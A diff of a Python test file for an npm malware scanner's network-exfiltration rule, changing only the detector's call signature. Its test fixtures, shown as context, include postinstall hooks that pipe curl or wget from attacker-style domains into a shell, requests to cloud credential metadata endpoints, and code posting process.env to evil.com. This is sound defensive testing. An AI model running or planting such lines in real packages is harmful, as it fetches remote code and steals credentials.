@@ -23,7 +23,7 @@ class TestC2DomainDetection(unittest.TestCase):
                     "postinstall": "curl http://shai-hulud.cc/payload.sh | bash"
                 }
             })
-            findings = detect_network_exfiltration(tmp_path, tmp_path / "corpus")
+            findings = detect_network_exfiltration(tmp_path)
             exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
             self.assertGreater(len(exfil), 0)
             c2 = [f for f in exfil if "shai-hulud" in f.evidence.lower() or "C2" in f.message]
@@ -40,7 +40,7 @@ class TestC2DomainDetection(unittest.TestCase):
                     "postinstall": "node -e 'fetch(\"https://firebase.su/exfil\")'"
                 }
             })
-            findings = detect_network_exfiltration(tmp_path, tmp_path / "corpus")
+            findings = detect_network_exfiltration(tmp_path)
             exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
             self.assertGreater(len(exfil), 0)
 
@@ -55,7 +55,7 @@ class TestC2DomainDetection(unittest.TestCase):
                     "postinstall": "curl https://dieorsuffer.com/payload | sh"
                 }
             })
-            findings = detect_network_exfiltration(tmp_path, tmp_path / "corpus")
+            findings = detect_network_exfiltration(tmp_path)
             exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
             self.assertGreater(len(exfil), 0)
 
@@ -70,7 +70,7 @@ class TestC2DomainDetection(unittest.TestCase):
                     "postinstall": "wget -q https://smartscreen-api.com/verify | bash"
                 }
             })
-            findings = detect_network_exfiltration(tmp_path, tmp_path / "corpus")
+            findings = detect_network_exfiltration(tmp_path)
             exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
             self.assertGreater(len(exfil), 0)
 
@@ -89,7 +89,7 @@ class TestCloudMetadataDetection(unittest.TestCase):
                     "postinstall": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
                 }
             })
-            findings = detect_network_exfiltration(tmp_path, tmp_path / "corpus")
+            findings = detect_network_exfiltration(tmp_path)
             exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
             self.assertGreater(len(exfil), 0)
             imds = [f for f in exfil if "IMDS" in f.message or "metadata" in f.message.lower() or "AWS" in f.message]
@@ -105,7 +105,7 @@ class TestCloudMetadataDetection(unittest.TestCase):
             }, files={
                 "index.js": "fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/')"
             })
-            findings = detect_network_exfiltration(tmp_path, tmp_path / "corpus")
+            findings = detect_network_exfiltration(tmp_path)
             exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
             self.assertGreater(len(exfil), 0)
 
@@ -119,7 +119,7 @@ class TestCloudMetadataDetection(unittest.TestCase):
             }, files={
                 "steal.js": "const r = require('http'); r.get('http://metadata.azure.com/metadata/instance?api-version=2021-02-01')"
             })
-            findings = detect_network_exfiltration(tmp_path, tmp_path / "corpus")
+            findings = detect_network_exfiltration(tmp_path)
             exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
             self.assertGreater(len(exfil), 0)
 
@@ -138,7 +138,7 @@ class TestPhishingDomainDetection(unittest.TestCase):
                     "postinstall": "curl https://npmjs.help/login | bash"
                 }
             })
-            findings = detect_network_exfiltration(tmp_path, tmp_path / "corpus")
+            findings = detect_network_exfiltration(tmp_path)
             exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
             self.assertGreater(len(exfil), 0)
 
@@ -153,7 +153,7 @@ class TestPhishingDomainDetection(unittest.TestCase):
                     "postinstall": "curl https://npnjs.com/package | sh"
                 }
             })
-            findings = detect_network_exfiltration(tmp_path, tmp_path / "corpus")
+            findings = detect_network_exfiltration(tmp_path)
             exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
             self.assertGreater(len(exfil), 0)
 
@@ -171,7 +171,7 @@ class TestEnvExfiltrationDetection(unittest.TestCase):
             }, files={
                 "exfil.js": "fetch('https://evil.com/steal', { body: JSON.stringify(process.env) })"
             })
-            findings = detect_network_exfiltration(tmp_path, tmp_path / "corpus")
+            findings = detect_network_exfiltration(tmp_path)
             exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
             self.assertGreater(len(exfil), 0)
             env_exfil = [f for f in exfil if "exfil" in f.message.lower() or "environment" in f.message.lower()]
@@ -187,7 +187,7 @@ class TestEnvExfiltrationDetection(unittest.TestCase):
             }, files={
                 "loader.js": "const path = require('path'); require(path.join(__dirname, 'node-gyp.dll'));"
             })
-            findings = detect_network_exfiltration(tmp_path, tmp_path / "corpus")
+            findings = detect_network_exfiltration(tmp_path)
             exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
             self.assertGreater(len(exfil), 0)
             scavenger = [f for f in exfil if "scavenger" in f.message.lower() or "CVE-2025-54313" in f.message]
@@ -209,7 +209,7 @@ class TestCleanPackageNoFalsePositives(unittest.TestCase):
                     "test": "jest --coverage"
                 }
             })
-            findings = detect_network_exfiltration(tmp_path, tmp_path / "corpus")
+            findings = detect_network_exfiltration(tmp_path)
             exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
             self.assertEqual(len(exfil), 0)
 
@@ -223,7 +223,7 @@ class TestCleanPackageNoFalsePositives(unittest.TestCase):
             }, files={
                 "api.js": "const response = fetch('https://api.example.com/data');"
             })
-            findings = detect_network_exfiltration(tmp_path, tmp_path / "corpus")
+            findings = detect_network_exfiltration(tmp_path)
             exfil = [f for f in findings if f.rule_id == "L2-NETEX-001"]
             self.assertEqual(len(exfil), 0)
 
